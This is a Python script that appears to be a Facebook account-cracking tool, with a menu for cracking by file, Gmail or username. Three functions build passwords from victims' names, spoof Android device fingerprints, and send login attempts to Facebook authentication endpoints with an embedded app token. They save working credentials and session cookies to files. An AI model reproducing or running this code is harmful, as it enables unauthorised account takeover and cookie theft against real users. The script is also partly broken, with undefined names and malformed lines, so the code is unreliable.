

#-----------------import-----------------#
Source BY ARIYAN SABBIR
- Never Show your FaceðŸ¥±
- By Kids
"""
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

#------------------color-----------------#
script_status = "FREE"
months_check = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
date_now = datetime.datetime.now().day
month_now = months_check[str(datetime.datetime.now().month)]
date_month = str(month_now) + "-" + str(date_now)
#-------------------logo-------------------#
def logo():
    os.system("clear")
    print(f"""\x1b[1;97m{W}
  .d8b.  d8888b. d888888b db    db  .d8b.  d8b   db 
 d8' `8b 88  `8D   `88'   `8b  d8' d8' `8b 888o  88 
 88ooo88 88oobY'    88     `8bd8'  88ooo88 88V8o 88 
 88~~~88 88`8b      88       88    88~~~88 88 V8o88 
 88   88 88 `88.   .88.      88    88   88 88  V888 
 YP   YP 88   YD Y888888P    YP    YP   YP VP   V8P 
\t   \033[31;42mARIYAN SABBIR\33[0;m\__ðŸ˜˜ðŸ˜ˆ
{40*"="} \x1b[1;97m
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : ARIYAN SABBIR
  [\x1b[1;95m+\x1b[1;97m] GITHUB : HIROSHI   
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : SIMÓN
  [\x1b[1;95m+\x1b[1;97m] YOU TUBE : SIMÓN                       
  [\x1b[1;95m+\x1b[1;97m] VERSION : {0.2}
{40*"="}\x1b[1;97m""").      
def Main():
	logo()
	print(f' {W}[{G}1{W}]{W}\033[38;5;46m[{G}FILE{W}]');print(f' {W}[{G}2{W}]{W}\033[38;5;46mCRACK [{G}RANDOM STORE{W}]');print(f' {W}[{G}3{W}]{W}\033[38;5;46mCRACK [{G}GMAIL{W}]');print(f' {W}[{G}4{W}]{W}\033[38;5;46mCRACK\033[38;5;46m[{G}USERNAME{W}]') #;print(f' {W}[{G}E{W}]{W} CRACK [{G}UID{W}]')
	line()
	gh=input(f' [{G}+{W}] Choice : {G}')
	if gh in ["T","a","1"]:
		menu1()
	elif gh in ["O","b","2"]:
		menu2()
	elif gh in ["X","c","3"]:
		menu3()
	elif gh in ["IC","d","4"]:
		menu4()
	else:
		line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()



#-------------------main def------------------#
 

#--------------------FILE CLONING------------------#
#b-api method
#1method
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				
				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
				application_version_code=str(random.randint(000000000,999999999))
				__iam_genius = random.choice(android_models)
				phone_model = __iam_genius.split('|')[0]
				phone_company = __iam_genius.split('|')[1]
				dimensions = __iam_genius.split('|')[2]
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
				device_family_id = str(uuid.uuid4())
				adid = str(uuid.uuid4())
				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
				data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
				head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'user-agent':ua_string,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
				url = 'https://b-api.facebook.com/method/auth.login'
				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
						break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(10)
		except Exception as e:
			pass
#m2
#b-graph method		
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
  #method3             
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"email": ids,
"password": pas,
"generate_analytics_claims": "1",
"credentials_type": "password",
"source": "login",
"error_detail_type": "button_with_disabled",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"generate_machine_id": "1",
"fb_api_req_friendly_name": "authenticate",}
                        headers={
                                "Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent": ua,
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [CYT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/CYT-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/CYT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass

#-----------------------END-----------------#
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()